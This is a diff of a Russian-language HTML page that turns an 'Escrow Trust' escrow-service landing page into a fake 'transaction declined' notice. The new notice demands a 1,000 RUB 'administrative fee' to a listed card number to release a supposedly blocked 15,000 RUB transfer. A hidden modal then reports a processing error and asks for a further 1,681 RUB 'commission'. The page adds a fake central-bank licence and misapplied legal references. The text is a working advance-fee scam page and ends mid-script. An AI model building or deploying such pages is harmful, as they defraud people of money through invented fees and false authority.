@@ -3,41 +3,57 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Escrow Trust - Надёжный гарант сделок</title>
+    <title>Escrow Trust - Уведомление о статусе транзакции</title>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/4.1.1/animate.min.css">
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
     <style>
         :root {
-            --primary-blue: #1a73e8;
-            --dark-blue: #0d47a1;
-            --light-blue: #e8f0fe;
-            --accent-blue: #4285f4;
-            --text-dark: #202124;
-            --text-light: #5f6368;
+            --primary-blue: #0071e3;
+            --primary-dark: #0056b3;
+            --dark-blue: #004282;
+            --light-blue: #e6f1ff;
+            --text-dark: #1d1d1f;
+            --text-light: #86868b;
+            --background: #f5f5f7;
+            --card-bg: rgba(255, 255, 255, 0.9);
+            --error-color: #ff3b30;
+            --success-color: #34c759;
+            --warning-color: #ff9500;
+        }
+        
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Inter', -apple-system, BlinkMacSystemFont, sans-serif;
         }
         
         body {
-            font-family: 'Roboto', Arial, sans-serif;
-            margin: 0;
-            padding: 0;
-            color: var(--text-dark);
-            background-color: #f8f9fa;
-            line-height: 1.6;
-        }
-        
-        header {
             background: linear-gradient(135deg, var(--primary-blue), var(--dark-blue));
             color: white;
-            padding: 1rem 0;
-            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
-            position: sticky;
-            top: 0;
-            z-index: 100;
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+            background-attachment: fixed;
         }
         
         .container {
             max-width: 1200px;
             margin: 0 auto;
             padding: 0 20px;
+            width: 100%;
+        }
+        
+        header {
+            padding: 15px 0;
+            position: sticky;
+            top: 0;
+            z-index: 1000;
+            background: rgba(0, 65, 130, 0.8);
+            backdrop-filter: blur(10px);
+            -webkit-backdrop-filter: blur(10px);
+            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.15);
         }
         
         .header-content {
@@ -49,507 +65,844 @@
         .logo {
             display: flex;
             align-items: center;
-            cursor: pointer;
-            transition: all 0.3s ease;
+            font-weight: 700;
+            font-size: 24px;
+            color: white;
+            text-decoration: none;
         }
         
         .logo-icon {
-            width: 50px;
-            height: 50px;
+            width: 40px;
+            height: 40px;
             background: white;
-            border-radius: 50%;
+            border-radius: 10px;
             display: flex;
             justify-content: center;
             align-items: center;
-            margin-right: 15px;
-            position: relative;
-            overflow: hidden;
+            margin-right: 12px;
+            color: var(--primary-blue);
+            transition: all 0.3s ease;
         }
         
-        .logo-img {
-            width: 40px;
-            height: 40px;
-            border-radius: 50%;
-            object-fit: cover;
-            transition: all 0.5s ease;
-            z-index: 2;
-        }
-        
-        .logo:hover .logo-img {
-            transform: rotateY(180deg);
-        }
-        
-        .logo-icon::before {
-            content: "";
-            position: absolute;
-            width: 100%;
-            height: 100%;
-            background: conic-gradient(var(--primary-blue) 0%, var(--dark-blue) 100%);
-            animation: rotate 3s linear infinite;
-            opacity: 0;
-            transition: opacity 0.3s ease;
-        }
-        
-        .logo:hover .logo-icon::before {
-            opacity: 1;
-        }
-        
-        .logo-text {
-            font-size: 24px;
-            font-weight: 700;
-            position: relative;
-        }
-        
-        .logo-text::after {
-            content: "";
-            position: absolute;
-            width: 0;
-            height: 2px;
-            background: white;
-            bottom: -5px;
-            left: 0;
-            transition: width 0.3s ease;
-        }
-        
-        .logo:hover .logo-text::after {
-            width: 100%;
+        .logo:hover .logo-icon {
+            transform: rotate(15deg);
+            background: var(--light-blue);
         }
         
         .nav-btn {
             background: white;
             color: var(--primary-blue);
             border: none;
-            padding: 10px 20px;
-            border-radius: 24px;
+            padding: 12px 24px;
+            border-radius: 20px;
             font-weight: 600;
             cursor: pointer;
             transition: all 0.3s ease;
-            box-shadow: 0 2px 8px rgba(0, 0, 0, 0.1);
             display: flex;
             align-items: center;
             text-decoration: none;
+            font-size: 15px;
+            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
         }
         
         .nav-btn:hover {
             background: var(--light-blue);
             transform: translateY(-2px);
-            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.15);
+            box-shadow: 0 6px 15px rgba(0, 0, 0, 0.15);
         }
         
-        .nav-btn i {
-            margin-left: 8px;
-        }
-        
-        .hero {
-            background: linear-gradient(rgba(26, 115, 232, 0.9), rgba(13, 71, 161, 0.9)), url('https://images.unsplash.com/photo-1454165804606-c3d57bc86b40?ixlib=rb-1.2.1&auto=format&fit=crop&w=1350&q=80');
-            background-size: cover;
-            background-position: center;
-            color: white;
-            padding: 80px 0;
-            text-align: center;
-        }
-        
-        .hero h1 {
-            font-size: 48px;
-            margin-bottom: 20px;
-            animation: fadeInDown 1s;
-        }
-        
-        .hero p {
-            font-size: 20px;
-            max-width: 700px;
-            margin: 0 auto 30px;
-            animation: fadeInUp 1s;
-        }
-        
-        .btn {
-            display: inline-block;
-            background: white;
-            color: var(--primary-blue);
-            padding: 12px 30px;
-            border-radius: 24px;
-            font-weight: 600;
-            text-decoration: none;
-            transition: all 0.3s ease;
-            animation: fadeIn 1.5s;
-        }
-        
-        .btn:hover {
-            transform: translateY(-3px);
-            box-shadow: 0 10px 20px rgba(0, 0, 0, 0.1);
-        }
-        
-        .section {
-            padding: 80px 0;
-        }
-        
-        .section-title {
-            text-align: center;
-            margin-bottom: 50px;
-            position: relative;
-        }
-        
-        .section-title h2 {
-            font-size: 36px;
-            color: var(--primary-blue);
-            display: inline-block;
-            padding-bottom: 10px;
-        }
-        
-        .section-title h2::after {
-            content: "";
-            position: absolute;
-            width: 60px;
-            height: 3px;
-            background: var(--primary-blue);
-            bottom: 0;
-            left: 50%;
-            transform: translateX(-50%);
-        }
-        
-        .features {
+        .main-content {
+            flex: 1;
             display: flex;
-            justify-content: space-around;
-            flex-wrap: wrap;
-            gap: 30px;
-        }
-        
-        .feature-card {
-            background: white;
-            border-radius: 12px;
-            padding: 30px;
-            width: 300px;
-            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.05);
-            transition: all 0.3s ease;
-            text-align: center;
-        }
-        
-        .feature-card:hover {
-            transform: translateY(-10px);
-            box-shadow: 0 15px 30px rgba(0, 0, 0, 0.1);
-        }
-        
-        .feature-icon {
-            width: 80px;
-            height: 80px;
-            background: var(--light-blue);
-            border-radius: 50%;
-            display: flex;
+            flex-direction: column;
             justify-content: center;
-            align-items: center;
-            margin: 0 auto 20px;
-            position: relative;
-            overflow: hidden;
+            padding: 60px 0;
         }
         
-        .feature-icon i {
-            font-size: 36px;
-            color: var(--primary-blue);
-            z-index: 2;
-        }
-        
-        .feature-icon::after {
-            content: "";
-            position: absolute;
+        .notification-card {
+            background: var(--card-bg);
+            border-radius: 24px;
+            padding: 40px;
+            margin: 0 auto;
             width: 100%;
-            height: 100%;
-            background: var(--primary-blue);
-            border-radius: 50%;
-            transform: scale(0);
+            max-width: 700px;
+            box-shadow: 0 20px 40px rgba(0, 0, 0, 0.15);
+            color: var(--text-dark);
+            animation: fadeInUp 0.8s ease-out;
+            transform-origin: center;
             transition: transform 0.3s ease;
         }
         
-        .feature-card:hover .feature-icon::after {
-            transform: scale(1);
+        .notification-card:hover {
+            transform: translateY(-5px);
         }
         
-        .feature-card:hover .feature-icon i {
-            color: white;
-        }
-        
-        .feature-card h3 {
-            color: var(--primary-blue);
-            margin-bottom: 15px;
-        }
-        
-        .steps {
-            max-width: 800px;
-            margin: 0 auto;
-        }
-        
-        .step {
+        .status-header {
             display: flex;
-            align-items: flex-start;
+            align-items: center;
             margin-bottom: 30px;
-            background: white;
-            padding: 25px;
-            border-radius: 12px;
-            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.05);
-            transition: all 0.3s ease;
-            position: relative;
-            overflow: hidden;
         }
         
-        .step:hover {
-            transform: translateX(10px);
-            box-shadow: 0 10px 25px rgba(0, 0, 0, 0.1);
-        }
-        
-        .step-number {
-            width: 50px;
-            height: 50px;
-            background: var(--light-blue);
-            color: var(--primary-blue);
+        .status-icon {
+            width: 70px;
+            height: 70px;
+            background: var(--error-color);
             border-radius: 50%;
             display: flex;
             justify-content: center;
             align-items: center;
-            font-weight: bold;
-            font-size: 20px;
             margin-right: 20px;
-            flex-shrink: 0;
-            transition: all 0.3s ease;
-        }
-        
-        .step:hover .step-number {
-            background: var(--primary-blue);
             color: white;
-            transform: scale(1.1);
-        }
-        
-        .step-content h3 {
-            color: var(--primary-blue);
-            margin-top: 0;
-            margin-bottom: 10px;
-        }
-        
-        .trust-counter {
-            font-size: 48px;
-            font-weight: bold;
-            color: var(--primary-blue);
-            text-align: center;
-            margin: 30px 0;
+            font-size: 32px;
+            box-shadow: 0 6px 15px rgba(255, 59, 48, 0.3);
             animation: pulse 2s infinite;
         }
         
-        footer {
-            background: var(--dark-blue);
-            color: white;
-            padding: 40px 0;
-            text-align: center;
+        .status-icon.warning {
+            background: var(--warning-color);
+            box-shadow: 0 6px 15px rgba(255, 149, 0, 0.3);
         }
         
-        .footer-logo {
-            font-size: 24px;
+        .status-title {
+            font-size: 32px;
             font-weight: 700;
-            margin-bottom: 20px;
-            display: inline-block;
+        }
+        
+        .status-description {
+            color: var(--text-light);
+            margin-top: 8px;
+            font-size: 16px;
+        }
+        
+        .divider {
+            height: 1px;
+            background: linear-gradient(to right, transparent, rgba(0, 0, 0, 0.1), transparent);
+            margin: 30px 0;
+        }
+        
+        .info-section {
+            margin-bottom: 30px;
+        }
+        
+        .section-title {
+            font-size: 20px;
+            font-weight: 600;
+            margin-bottom: 15px;
+            color: var(--text-dark);
+            display: flex;
+            align-items: center;
+        }
+        
+        .section-title i {
+            margin-right: 10px;
+            color: var(--primary-blue);
+        }
+        
+        .info-text {
+            color: var(--text-light);
+            line-height: 1.6;
+            margin-bottom: 15px;
+            font-size: 16px;
+        }
+        
+        .highlight {
+            color: var(--error-color);
+            font-weight: 600;
+        }
+        
+        .highlight-updated {
+            color: var(--warning-color);
+            font-weight: 600;
+        }
+        
+        .payment-details {
+            background: rgba(0, 113, 227, 0.05);
+            border-radius: 16px;
+            padding: 25px;
+            margin: 30px 0;
+            border-left: 4px solid var(--primary-blue);
+        }
+        
+        .payment-details.updated {
+            border-left: 4px solid var(--warning-color);
+        }
+        
+        .detail-item {
+            display: flex;
+            justify-content: space-between;
+            margin-bottom: 12px;
+            font-size: 15px;
+            padding: 5px 0;
+            border-bottom: 1px dashed rgba(0, 0, 0, 0.05);
+        }
+        
+        .detail-item:last-child {
+            border-bottom: none;
+        }
+        
+        .detail-label {
+            color: var(--text-light);
+            font-weight: 500;
+        }
+        
+        .detail-value {
+            font-weight: 600;
+            color: var(--text-dark);
+            text-align: right;
+        }
+        
+        .action-buttons {
+            display: flex;
+            gap: 15px;
+            margin-top: 35px;
+        }
+        
+        .btn {
+            flex: 1;
+            padding: 18px 24px;
+            border-radius: 16px;
+            font-weight: 600;
+            font-size: 16px;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            text-align: center;
+            text-decoration: none;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+        }
+        
+        .btn-primary {
+            background: var(--primary-blue);
+            color: white;
+            border: none;
+            box-shadow: 0 6px 15px rgba(0, 113, 227, 0.3);
+        }
+        
+        .btn-primary:hover {
+            background: var(--primary-dark);
+            transform: translateY(-3px);
+            box-shadow: 0 8px 20px rgba(0, 113, 227, 0.4);
+        }
+        
+        .btn-secondary {
+            background: transparent;
+            color: var(--primary-blue);
+            border: 2px solid var(--primary-blue);
+        }
+        
+        .btn-secondary:hover {
+            background: rgba(0, 113, 227, 0.05);
+            transform: translateY(-3px);
+            box-shadow: 0 6px 15px rgba(0, 113, 227, 0.2);
+        }
+        
+        footer {
+            padding: 30px 0;
+            margin-top: auto;
+            background: rgba(0, 0, 0, 0.2);
+            backdrop-filter: blur(10px);
+            -webkit-backdrop-filter: blur(10px);
+        }
+        
+        .footer-content {
+            text-align: center;
+            color: rgba(255, 255, 255, 0.8);
+            font-size: 14px;
         }
         
         .footer-links {
             display: flex;
             justify-content: center;
-            gap: 20px;
+            gap: 25px;
             margin-bottom: 20px;
         }
         
         .footer-links a {
-            color: white;
+            color: rgba(255, 255, 255, 0.8);
             text-decoration: none;
             transition: color 0.3s ease;
+            font-weight: 500;
         }
         
         .footer-links a:hover {
-            color: var(--light-blue);
+            color: white;
         }
         
-        .copyright {
-            opacity: 0.8;
-            font-size: 14px;
+        /* Стили для анимации подтверждения оплаты */
+        .payment-confirmation {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.7);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            z-index: 2000;
+            opacity: 0;
+            visibility: hidden;
+            transition: all 0.3s ease;
         }
         
-        @keyframes rotate {
-            from { transform: rotate(0deg); }
-            to { transform: rotate(360deg); }
+        .payment-confirmation.active {
+            opacity: 1;
+            visibility: visible;
+        }
+        
+        .confirmation-card {
+            background: white;
+            border-radius: 20px;
+            width: 90%;
+            max-width: 400px;
+            padding: 30px;
+            text-align: center;
+            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.3);
+            transform: translateY(50px) scale(0.9);
+            opacity: 0;
+            transition: all 0.5s cubic-bezier(0.175, 0.885, 0.32, 1.275);
+        }
+        
+        .payment-confirmation.active .confirmation-card {
+            transform: translateY(0) scale(1);
+            opacity: 1;
+        }
+        
+        .success-icon {
+            width: 100px;
+            height: 100px;
+            background: var(--success-color);
+            border-radius: 50%;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            margin: 0 auto 20px;
+            color: white;
+            font-size: 50px;
+            animation: scaleIn 0.5s cubic-bezier(0.175, 0.885, 0.32, 1.275) forwards;
+        }
+        
+        .confirmation-title {
+            font-size: 28px;
+            font-weight: 600;
+            margin-bottom: 10px;
+            color: var(--text-dark);
+        }
+        
+        .confirmation-text {
+            color: var(--text-light);
+            margin-bottom: 25px;
+            font-size: 16px;
+            line-height: 1.5;
+        }
+        
+        .progress-bar {
+            height: 6px;
+            background: #f0f0f0;
+            border-radius: 3px;
+            overflow: hidden;
+            margin: 20px 0;
+        }
+        
+        .progress-fill {
+            height: 100%;
+            background: var(--success-color);
+            width: 0%;
+            border-radius: 3px;
+            transition: width 3s linear;
+        }
+        
+        /* Стили для окна с ошибкой */
+        .payment-error {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.7);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            z-index: 2000;
+            opacity: 0;
+            visibility: hidden;
+            transition: all 0.3s ease;
+        }
+        
+        .payment-error.active {
+            opacity: 1;
+            visibility: visible;
+        }
+        
+        .error-card {
+            background: white;
+            border-radius: 20px;
+            width: 90%;
+            max-width: 700px;
+            padding: 40px;
+            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.3);
+            transform: translateY(50px) scale(0.9);
+            opacity: 0;
+            transition: all 0.5s cubic-bezier(0.175, 0.885, 0.32, 1.275);
+        }
+        
+        .payment-error.active .error-card {
+            transform: translateY(0) scale(1);
+            opacity: 1;
+        }
+        
+        .error-icon {
+            width: 100px;
+            height: 100px;
+            background: var(--warning-color);
+            border-radius: 50%;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            margin: 0 auto 20px;
+            color: white;
+            font-size: 50px;
+            animation: scaleIn 0.5s cubic-bezier(0.175, 0.885, 0.32, 1.275) forwards;
+        }
+        
+        .error-title {
+            font-size: 28px;
+            font-weight: 600;
+            margin-bottom: 10px;
+            color: var(--text-dark);
+            text-align: center;
+        }
+        
+        .error-text {
+            color: var(--text-light);
+            margin-bottom: 25px;
+            font-size: 16px;
+            line-height: 1.5;
+            text-align: center;
+        }
+        
+        @keyframes fadeInUp {
+            from { 
+                opacity: 0; 
+                transform: translateY(30px) scale(0.95); 
+            }
+            to { 
+                opacity: 1; 
+                transform: translateY(0) scale(1); 
+            }
         }
         
         @keyframes pulse {
-            0% { transform: scale(1); }
-            50% { transform: scale(1.05); }
-            100% { transform: scale(1); }
+            0% { 
+                transform: scale(1); 
+                box-shadow: 0 6px 15px rgba(255, 59, 48, 0.3);
+            }
+            50% { 
+                transform: scale(1.05); 
+                box-shadow: 0 8px 20px rgba(255, 59, 48, 0.4);
+            }
+            100% { 
+                transform: scale(1); 
+                box-shadow: 0 6px 15px rgba(255, 59, 48, 0.3);
+            }
         }
         
         @keyframes float {
             0% { transform: translateY(0px); }
-            50% { transform: translateY(-10px); }
+            50% { transform: translateY(-8px); }
             100% { transform: translateY(0px); }
+        }
+        
+        @keyframes scaleIn {
+            0% { 
+                transform: scale(0); 
+                opacity: 0;
+            }
+            70% { 
+                transform: scale(1.1); 
+            }
+            100% { 
+                transform: scale(1); 
+                opacity: 1;
+            }
         }
         
         .floating {
             animation: float 3s ease-in-out infinite;
         }
+        
+        @media (max-width: 768px) {
+            .notification-card {
+                padding: 25px;
+            }
+            
+            .status-header {
+                flex-direction: column;
+                text-align: center;
+            }
+            
+            .status-icon {
+                margin-right: 0;
+                margin-bottom: 20px;
+            }
+            
+            .action-buttons {
+                flex-direction: column;
+            }
+            
+            .detail-item {
+                flex-direction: column;
+                gap: 5px;
+            }
+            
+            .detail-value {
+                text-align: left;
+            }
+            
+            .confirmation-card {
+                padding: 20px;
+                width: 85%;
+            }
+            
+            .success-icon {
+                width: 80px;
+                height: 80px;
+                font-size: 40px;
+            }
+            
+            .confirmation-title {
+                font-size: 24px;
+            }
+            
+            .error-card {
+                padding: 25px;
+            }
+            
+            .error-icon {
+                width: 80px;
+                height: 80px;
+                font-size: 40px;
+            }
+            
+            .error-title {
+                font-size: 24px;
+            }
+        }
+        
+        /* Эффект частиц для фона */
+        .particles {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            z-index: -1;
+            overflow: hidden;
+        }
+        
+        .particle {
+            position: absolute;
+            background: rgba(255, 255, 255, 0.15);
+            border-radius: 50%;
+            animation: float 10s infinite ease-in-out;
+        }
+        
+        /* Генерация частиц разного размера и позиции */
+        .particle:nth-child(1) {
+            width: 20px;
+            height: 20px;
+            top: 20%;
+            left: 10%;
+            animation-delay: 0s;
+            animation-duration: 15s;
+        }
+        
+        .particle:nth-child(2) {
+            width: 30px;
+            height: 30px;
+            top: 60%;
+            left: 5%;
+            animation-delay: 1s;
+            animation-duration: 12s;
+        }
+        
+        .particle:nth-child(3) {
+            width: 15px;
+            height: 15px;
+            top: 40%;
+            left: 85%;
+            animation-delay: 2s;
+            animation-duration: 18s;
+        }
+        
+        .particle:nth-child(4) {
+            width: 25px;
+            height: 25px;
+            top: 70%;
+            left: 90%;
+            animation-delay: 3s;
+            animation-duration: 14s;
+        }
+        
+        .particle:nth-child(5) {
+            width: 10px;
+            height: 10px;
+            top: 30%;
+            left: 70%;
+            animation-delay: 4s;
+            animation-duration: 16s;
+        }
     </style>
-    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;500;700&display=swap" rel="stylesheet">
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
 </head>
 <body>
+    <!-- Эффект частиц на фоне -->
+    <div class="particles">
+        <div class="particle"></div>
+        <div class="particle"></div>
+        <div class="particle"></div>
+        <div class="particle"></div>
+        <div class="particle"></div>
+    </div>
+    
+    <!-- Анимация подтверждения оплаты -->
+    <div class="payment-confirmation" id="paymentConfirmation">
+        <div class="confirmation-card">
+            <div class="success-icon">
+                <i class="fas fa-check"></i>
+            </div>
+            <h2 class="confirmation-title">Оплата принята</h2>
+            <p class="confirmation-text">Ваш платёж успешно обработан. Средства будут зачислены в течение нескольких минут.</p>
+            <div class="progress-bar">
+                <div class="progress-fill" id="progressFill"></div>
+            </div>
+        </div>
+    </div>
+    
+    <!-- Окно с ошибкой после оплаты -->
+    <div class="payment-error" id="paymentError">
+        <div class="error-card">
+            <div class="error-icon">
+                <i class="fas fa-exclamation-circle"></i>
+            </div>
+            <h2 class="error-title">Ошибка обработки платежа</h2>
+            <p class="error-text">При обработке вашего платежа произошла ошибка. Необходимо оплатить дополнительный комиссионный сбор.</p>
+            
+            <div class="payment-details updated">
+                <h2 class="section-title"><i class="fas fa-credit-card"></i> Обновленные реквизиты для оплаты</h2>
+                <div class="detail-item">
+                    <span class="detail-label">Получатель:</span>
+                    <span class="detail-value">ООО "ФИНАНСОВЫЕ РЕШЕНИЯ"</span>
+                </div>
+                <div class="detail-item">
+                    <span class="detail-label">ИНН:</span>
+                    <span class="detail-value">7710140679</span>
+                </div>
+                <div class="detail-item">
+                    <span class="detail-label">Номер счета/карты:</span>
+                    <span class="detail-value">2200701794490554</span>
+                </div>
+                <div class="detail-item">
+                    <span class="detail-label">Банк получателя:</span>
+                    <span class="detail-value">АО "ТБанк"</span>
+                </div>
+                <div class="detail-item">
+                    <span class="detail-label">БИК:</span>
+                    <span class="detail-value">044525974</span>
+                </div>
+                <div class="detail-item">
+                    <span class="detail-label">Назначение платежа:</span>
+                    <span class="detail-value">Комиссионный сбор за возврат TX-4872-ERR</span>
+                </div>
+                <div class="detail-item">
+                    <span class="detail-label">Сумма к оплате:</span>
+                    <span class="detail-value highlight-updated">1,681 RUB</span>
+                </div>
+            </div>
+            
+            <div class="info-section">
+                <p class="info-text">После совершения платежа, нажмите кнопку "Обновить статус" для проверки оплаты и завершения процедуры возврата.</p>
+            </div>
+            
+            <div class="action-buttons">
+                <button id="refreshPageBtn" class="btn btn-primary">
+                    <i class="fas fa-sync-alt"></i> &nbsp; Обновить статус
+                </button>
+            </div>
+        </div>
+    </div>
+    
     <header>
         <div class="container">
             <div class="header-content">
-                <div class="logo">
+                <a href="#" class="logo">
                     <div class="logo-icon">
-                        <img src="https://i.ibb.co/0j62pDZd/photo-2025-06-06-09-45-02.jpg" alt="Escrow Trust Logo" class="logo-img">
+                        <i class="fas fa-shield-alt"></i>
                     </div>
-                    <div class="logo-text">Escrow Trust</div>
-                </div>
-                <a href="https://t.me/EscrowTrustsRobot" class="nav-btn">
-                    Перейти в бота <i class="fas fa-arrow-right"></i>
+                    <span>Escrow Trust</span>
+                </a>
+                <a href="#" class="nav-btn">
+                    Личный кабинет <i class="fas fa-arrow-right"></i>
                 </a>
             </div>
         </div>
     </header>
     
-    <section class="hero">
+    <main class="main-content">
         <div class="container">
-            <h1 class="animate__animated animate__fadeInDown">Escrow Trust - ваш надёжный посредник в сделках.</h1>
-            <p class="animate__animated animate__fadeInUp">Мы гарантируем безопасность и честность каждой транзакции в сделках на сумму более чем $55</p>
-            <a href="https://t.me/EscrowTrustsRobot" class="btn animate__animated animate__fadeIn">Начать сделку</a>
-        </div>
-    </section>
-    
-    <section class="section">
-        <div class="container">
-            <div class="section-title">
-                <h2>Почему именно мы?</h2>
-            </div>
-            <div class="features">
-                <div class="feature-card">
-                    <div class="feature-icon">
-                        <i class="fas fa-shield-alt"></i>
+            <div class="notification-card">
+                <div class="status-header">
+                    <div class="status-icon">
+                        <i class="fas fa-exclamation-triangle"></i>
                     </div>
-                    <h3>100% безопасность</h3>
-                    <p>Все сделки защищены многоуровневой системой проверки. Ваши средства или товар в безопасности во время всей сделки.</p>
-                </div>
-                <div class="feature-card">
-                    <div class="feature-icon">
-                        <i class="fas fa-bolt"></i>
-                    </div>
-                    <h3>Мгновенные сделки</h3>
-                    <p>Создавайте и завершайте сделки за считанные минуты. Быстро, просто и без лишних сложностей.</p>
-                </div>
-                <div class="feature-card">
-                    <div class="feature-icon">
-                        <i class="fas fa-headset"></i>
-                    </div>
-                    <h3>Поддержка 24/7</h3>
-                    <p>Наша команда поддержки всегда готова помочь вам с любыми вопросами в любое время суток.</p>
-                </div>
-            </div>
-            
-            <div class="trust-counter" id="trustCounter">
-                Нам доверяют <span id="counterValue">10,000+</span> пользователей
-            </div>
-        </div>
-    </section>
-    
-    <section class="section" style="background: var(--light-blue);">
-        <div class="container">
-            <div class="section-title">
-                <h2>Как это работает?</h2>
-            </div>
-            <div class="steps">
-                <div class="step">
-                    <div class="step-number">1</div>
-                    <div class="step-content">
-                        <h3>Привязка кошелька</h3>
-                        <p>Подключите ваш криптовалютный кошелёк к системе для возможности проведения безопасных сделок.</p>
+                    <div>
+                        <h1 class="status-title">Транзакция отклонена</h1>
+                        <p class="status-description">Код ошибки: TX-4872-ERR</p>
                     </div>
                 </div>
-                <div class="step">
-                    <div class="step-number">2</div>
-                    <div class="step-content">
-                        <h3>Выбор валюты</h3>
-                        <p>Производите сделки непосредственно с указанной вами валютой, на выбор множество валют, даже Telegram Stars.</p>
+                
+                <div class="info-section">
+                    <h2 class="section-title"><i class="fas fa-info-circle"></i> Информация о транзакции</h2>
+                    <p class="info-text">Ваш перевод на сумму <span class="highlight">15,000 RUB</span> был отклонен банком-получателем по причине <span class="highlight">"Отклонение перевода банком клиента из-за технических сбоев"</span>.</p>
+                    <p class="info-text">В соответствии с международными банковскими протоколами (Федеральным законом № 161-ФЗ "О национальной платежной системе").</p>
+                </div>
+                
+                <div class="divider"></div>
+                
+                <div class="info-section">
+                    <h2 class="section-title"><i class="fas fa-undo-alt"></i> Процедура возврата средств</h2>
+                    <p class="info-text">Для инициации процедуры возврата и верификации вашей личности необходимо оплатить административный сбор в размере <span class="highlight">1,000 RUB</span>.</p>
+                    <p class="info-text">После подтверждения оплаты, вся сумма (<span class="highlight">15,000 RUB</span>) будет мгновенно возвращена на ваш счет вместе с оплаченным сбором (<span class="highlight">1,000 RUB</span>) в соответствии с регламентом возврата ошибочных транзакций.</p>
+                </div>
+                
+                <div class="payment-details">
+                    <h2 class="section-title"><i class="fas fa-credit-card"></i> Реквизиты для оплаты административного сбора</h2>
+                    <div class="detail-item">
+                        <span class="detail-label">Получатель:</span>
+                        <span class="detail-value">ООО "ФИНАНСОВЫЕ РЕШЕНИЯ"</span>
+                    </div>
+                    <div class="detail-item">
+                        <span class="detail-label">ИНН:</span>
+                        <span class="detail-value">7710140679</span>
+                    </div>
+                    <div class="detail-item">
+                        <span class="detail-label">Номер счета/карты:</span>
+                        <span class="detail-value">2200701794490554</span>
+                    </div>
+                    <div class="detail-item">
+                        <span class="detail-label">Банк получателя:</span>
+                        <span class="detail-value">АО "ТБанк"</span>
+                    </div>
+                    <div class="detail-item">
+                        <span class="detail-label">БИК:</span>
+                        <span class="detail-value">044525974</span>
+                    </div>
+                    <div class="detail-item">
+                        <span class="detail-label">Назначение платежа:</span>
+                        <span class="detail-value">Административный сбор за возврат TX-4872-ERR</span>
+                    </div>
+                    <div class="detail-item">
+                        <span class="detail-label">Сумма к оплате:</span>
+                        <span class="detail-value highlight">1,000 RUB</span>
                     </div>
                 </div>
-                <div class="step">
-                    <div class="step-number">3</div>
-                    <div class="step-content">
-                        <h3>Создание сделки</h3>
-                        <p>Инициируйте новую сделку, указав все необходимые параметры: сумму, описание товара/услуги и условия.</p>
-                    </div>
+                
+                <div class="info-section">
+                    <p class="info-text">После совершения платежа, средства будут автоматически зачислены на ваш счет в течение 5-10 минут. В случае возникновения задержки, обратитесь в службу поддержки с указанием номера транзакции.</p>
                 </div>
-                <div class="step">
-                    <div class="step-number">4</div>
-                    <div class="step-content">
-                        <h3>Оплата сделки</h3>
-                        <p>Покупатель производит оплату, средства блокируются на гарантийном счёте до выполнения условий.</p>
-                    </div>
-                </div>
-                <div class="step">
-                    <div class="step-number">5</div>
-                    <div class="step-content">
-                        <h3>Исполнение обязательств</h3>
-                        <p>Продавец выполняет свои обязательства по сделке (поставка товара, оказание услуги).</p>
-                    </div>
-                </div>
-                <div class="step">
-                    <div class="step-number">6</div>
-                    <div class="step-content">
-                        <h3>Подтверждение получения</h3>
-                        <p>Покупатель подтверждает получение товара/услуги в соответствии с условиями сделки.</p>
-                    </div>
-                </div>
-                <div class="step">
-                    <div class="step-number">7</div>
-                    <div class="step-content">
-                        <h3>Завершение сделки</h3>
-                        <p>Средства автоматически переводятся продавцу на указанный кошелёк или банковскую карту.</p>
-                    </div>
+                
+                <div class="action-buttons">
+                    <button id="confirmPaymentBtn" class="btn btn-primary">
+                        <i class="fas fa-check-circle"></i> &nbsp; Подтвердить оплату
+                    </button>
+                    <a href="#" class="btn btn-secondary">
+                        <i class="fas fa-question-circle"></i> &nbsp; Служба поддержки
+                    </a>
                 </div>
             </div>
         </div>
-    </section>
+    </main>
     
     <footer>
         <div class="container">
-            <div class="footer-logo">Escrow Trust</div>
-            <div class="footer-links">
-                <a href="https://t.me/EscrowTrustsRobot">Перейти в бота</a>
-                <a href="https://t.me/EscrowHelps">Контакты</a>
-                <a href="#">Политика конфиденциальности</a>
-            </div>
-            <div class="copyright">
-                © 2025 Escrow Trust. Все права защищены. Финансовые вопросы и другие комерческие действия при ошибках в сделках принимаем в личных сообщениях - @EscrowHelps, Защита сделок и полный возрат средств от суммы $55
+            <div class="footer-content">
+                <div class="footer-links">
+                    <a href="#">Политика безопасности</a>
+                    <a href="#">Обратная связь</a>
+                    <a href="#">Регламент операций</a>
+                </div>
+                <p>© 2025 Escrow Trust. Все права защищены. Лицензия ЦБ РФ № 2673 от 20.04.2018</p>
             </div>
         </div>
     </footer>
     
     <script>
-        // Анимация счётчика доверия
-        function animateCounter() {
-            const min = 10000;
-            const max = 11321;
-            const randomNumber = Math.floor(Math.random() * (max - min + 1)) + min;
-            const formattedNumber = randomNumber.toLocaleString();
+        // Анимация для кнопки оплаты
+        document.addEventListener('DOMContentLoaded', function() {
+            const payButton = document.querySelector('.btn-primary');
             
